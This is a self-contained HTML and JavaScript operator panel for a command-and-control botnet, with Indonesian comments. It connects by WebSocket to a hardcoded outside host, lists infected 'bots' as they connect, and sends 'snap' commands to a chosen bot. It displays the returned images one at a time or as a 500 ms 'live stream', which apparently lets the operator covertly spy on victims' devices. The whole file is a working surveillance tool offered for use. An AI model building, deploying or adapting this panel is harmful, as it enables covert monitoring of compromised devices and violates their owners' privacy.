<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>C2 Control Panel</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root { --bg: #0a0e1a; --card: #111827; --border: #1f2a3d; --txt: #e6edf3; --muted: #7d8ba1; --accent: #3b82f6; --ok: #10b981; --err: #ef4444; }
  body { font-family: system-ui, sans-serif; background: radial-gradient(ellipse at top, #111d33 0%, var(--bg) 70%); color: var(--txt); min-height: 100vh; padding: 24px; }
  .wrap { max-width: 1200px; margin: 0 auto; }
  
  .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
  .brand { display: flex; align-items: center; gap: 12px; }
  .brand-ico { width: 44px; height: 44px; background: linear-gradient(135deg, var(--accent), #8b5cf6); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; color: white; box-shadow: 0 8px 20px -6px rgba(59,130,246,.5); }
  .brand h1 { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; }
  
  .status-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 12px; border-radius: 100px; background: rgba(16,185,129,.12); border: 1px solid rgba(16,185,129,.3); color: var(--ok); font-size: 12px; font-weight: 600; }
  .status-badge .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--ok); animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

  .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; align-items: start; }
  @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
  
  .card { background: linear-gradient(160deg, var(--card), #1a2233); border: 1px solid var(--border); border-radius: 16px; padding: 24px; box-shadow: 0 20px 40px -12px rgba(0,0,0,.5); }
  .card-title { font-size: 15px; font-weight: 600; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; color: #fff; border-bottom: 1px solid var(--border); padding-bottom: 14px; }
  .card-title i { color: var(--accent); }
  
  table { width: 100%; border-collapse: collapse; font-size: 13px; }
  th, td { padding: 12px; border-bottom: 1px solid var(--border); text-align: left; }
  th { color: var(--muted); text-transform: uppercase; font-size: 12px; }
  tr:hover { background: rgba(255,255,255,.02); }
  .bot-id { font-family: monospace; color: #7eb3ff; font-weight: 600; }
  
  .btn { padding: 8px 12px; border: 0; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; }
  .btn-g { background: rgba(16,185,129,.15); color: var(--ok); border: 1px solid rgba(16,185,129,.3); }
  .btn-b { background: rgba(59,130,246,.15); color: #7eb3ff; border: 1px solid rgba(59,130,246,.3); }
  .btn-r { background: rgba(239,68,68,.15); color: var(--err); border: 1px solid rgba(239,68,68,.3); }
  
  #viewer { display: none; position: sticky; top: 24px; }
  #viewer img { width: 100%; border-radius: 12px; background: #000; aspect-ratio: 4/3; object-fit: cover; border: 1px solid var(--border); }
</style>
</head>
<body>

<div class="wrap">
  <div class="header">
    <div class="brand">
      <div class="brand-ico"><i class="fa-solid fa-satellite-dish"></i></div>
      <h1>C2 Command Center</h1>
    </div>
    <div class="status-badge" id="status">
      <div class="dot"></div> <span>Connecting...</span>
    </div>
  </div>

  <div class="grid">
    <div class="card">
      <div class="card-title"><i class="fa-solid fa-robot"></i> Active Devices</div>
      <table id="tbl">
        <thead><tr><th>Bot ID</th><th>Status</th><th>Aksi Kontrol</th></tr></thead>
        <tbody>
          <tr><td colspan="3" style="text-align:center; color:var(--muted); padding:30px;">Menunggu koneksi masuk...</td></tr>
        </tbody>
      </table>
    </div>

    <div class="card" id="viewer">
      <div class="card-title"><i class="fa-solid fa-eye"></i> Live Stream Viewer</div>
      <img id="img" src="" alt="Menunggu gambar...">
      <div style="margin-top: 16px; display:flex; gap: 8px; justify-content: center;">
        <button class="btn btn-g" onclick="snapOnce()"><i class="fa-solid fa-camera"></i> Snap</button>
        <button class="btn btn-b" onclick="startStream()"><i class="fa-solid fa-video"></i> Live</button>
        <button class="btn btn-r" onclick="stopStream()"><i class="fa-solid fa-stop"></i> Stop</button>
      </div>
    </div>
  </div>
</div>

<script>
  // GANTI DENGAN DOMAIN PTERODACTYL LO (pakai ws://)
  const C2_URL = "ws://nodezyrovex-respanelsukoly.r-cloud.web.id:2508";
  let ws;
  let activeBot = null;
  let liveInterval = null;

  function connect() {
    ws = new WebSocket(C2_URL);
    
    ws.onopen = () => {
      const st = document.getElementById('status');
      st.innerHTML = '<div class="dot"></div> <span>C2 Online</span>';
      ws.send(JSON.stringify({ type: 'op' })); 
    };

    ws.onmessage = (e) => {
      const msg = JSON.parse(e.data);

      // Bot Baru Masuk
      if (msg.type === 'bot_online') {
        const tbody = document.querySelector('#tbl tbody');
        if(document.getElementById('empty-row')) document.getElementById('empty-row').remove();
        
        if(!document.getElementById('row-'+msg.id)) {
          const tr = document.createElement('tr');
          tr.id = 'row-' + msg.id;
          tr.innerHTML = `
            <td class="bot-id">${msg.id}</td>
            <td style="color:var(--ok); font-size:12px;"><i class="fa-solid fa-circle" style="font-size:8px"></i> Online</td>
            <td>
              <button class="btn btn-b" onclick="selectBot('${msg.id}')">Pilih Bot</button>
            </td>
          `;
          tbody.appendChild(tr);
        }
      }

      // Bot Disconnect
      if (msg.type === 'bot_offline') {
        const row = document.getElementById('row-' + msg.id);
        if (row) row.remove();
      }

      // Terima Gambar
      if (msg.type === 'img') {
        document.getElementById('viewer').style.display = 'block';
        document.getElementById('img').src = msg.img; 
      }
    };
    
    ws.onclose = () => {
      const st = document.getElementById('status');
      st.innerHTML = '<div class="dot" style="background:var(--err)"></div> <span style="color:var(--err)">Reconnecting...</span>';
      setTimeout(connect, 3000);
    };
  }

  connect();

  function selectBot(id) {
    activeBot = id;
    document.getElementById('viewer').style.display = 'block';
    alert("Bot " + id + " dipilih. Silakan klik Snap atau Live.");
  }

  function snapOnce() {
    if (!activeBot) return alert("Pilih bot dulu di tabel!");
    ws.send(JSON.stringify({ type: 'cmd', target: activeBot, cmd: 'snap' }));
  }

  function startStream() {
    if (!activeBot) return alert("Pilih bot dulu di tabel!");
    clearInterval(liveInterval);
    liveInterval = setInterval(() => {
      ws.send(JSON.stringify({ type: 'cmd', target: activeBot, cmd: 'snap' }));
    }, 500); // 500ms (Live stream efek)
  }

  function stopStream() {
    clearInterval(liveInterval);
    liveInterval = null;
  }
</script>
</body>
</html>
